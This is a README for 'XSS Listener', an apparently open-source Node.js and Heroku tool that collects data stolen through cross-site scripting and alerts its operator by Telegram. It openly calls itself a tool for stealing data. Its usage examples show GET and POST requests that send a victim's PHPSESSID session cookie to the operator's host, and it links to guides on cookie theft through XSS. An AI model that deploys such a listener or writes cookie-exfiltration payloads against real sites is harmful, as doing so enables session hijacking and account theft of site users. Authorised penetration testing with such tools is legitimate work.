![logo](https://cagatay.js.org/spider.png)

### 🕷️ XSS Listener is a penetration tool for easy to steal data with various XSS.

From now on, you do not need XSS listeners! XSS listener records the data you have stolen on the remote site in the database, and gives instant notification with telegram.

[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/cagataycali/xss-listener)

### 🕸️ Know-How Background

* [What is XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

* [Steal cookie with XSS without redirecting to another page](https://security.stackexchange.com/questions/49185/xss-cookie-stealing-without-redirecting-to-another-page)
* [TR | How to use XSS](https://canyoupwn.me/tr-how-to-use-xss/)


### 🕸️ Listener Usage

Listener accepts all HTTP methods with parameters, then save database.
Example:
```
GET https://yourapp.com/?cookie=PHPSESSID=889c6594db2541db1666cefca7537373

or

POST https://yourapp.com/
Form: { cookie:'PHPSESSID=889c6594db2541db1666cefca7537373' }
```
You will notify by telegram bot.
![output](https://cagatay.js.org/output.png)
---

### 🕸️ Detailed Usage

<details>

#### 🕸️ List previous requests
```
https://yourapp.com/list
```

#### 🕸️ Delete previous request by id
```
https://yourapp.com/delete/[id]
```

#### 🕸️ Even you can use telegram

```
/list
```

```
/delete [id]
```

</details>


#### 🕸️ Run local environment

In terminal,

```shell
git clone https://github.com/cagataycali/xss-listener.git; # Clone
cd xss-listener; # Change directory.
npm install; # Install dependencies.
# Fill bot token and user id.
TELEGRAM_TOKEN=[BOT TOKEN] TELEGRAM_USER_ID=[USER ID] node index.js
```

#### License

MIT © [Çağatay Çalı](https://cagatay.me)